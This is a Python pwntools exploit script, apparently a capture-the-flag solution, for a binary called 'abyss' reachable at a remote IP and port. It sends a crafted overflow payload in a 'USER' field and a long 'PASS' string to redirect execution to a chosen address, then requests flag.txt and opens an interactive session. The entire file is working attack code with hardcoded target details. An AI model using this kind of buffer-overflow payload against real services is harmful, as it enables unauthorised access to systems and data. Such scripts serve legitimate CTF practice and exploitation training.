from pwn import *

context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./abyss"
elf = ELF(vuln_path)
libc = elf.libc

io = process([vuln_path]) if not f_remote else remote("83.136.250.252", 46421)


def ddebug(b=""):
    if not f_gdb:
        return
    gdb.attach(io, gdbscript=b)
    pause()

# u64(io.recvuntil("\x7f")[-6:].ljust(8, b"\x00"))


payload = b""
ddebug("break *0x04013d0 \n b *0x401441 \n break *0x40142c if *(unsigned char*)($rbp - 4) == 0x1c \n b *0x040151c \n continue")
io.send(b"\x00"*4)

payload = b"\x1c" * 0x1d
payload += b"\xeb\x14\x40\x00"
io.sendline(b"USER " + payload)
sleep(1)
io.send(b"PASS " + b"2"*(512-5))

sleep(1)
io.sendline(b"flag.txt\x00")
data = io.recv(100)
io.interactive()
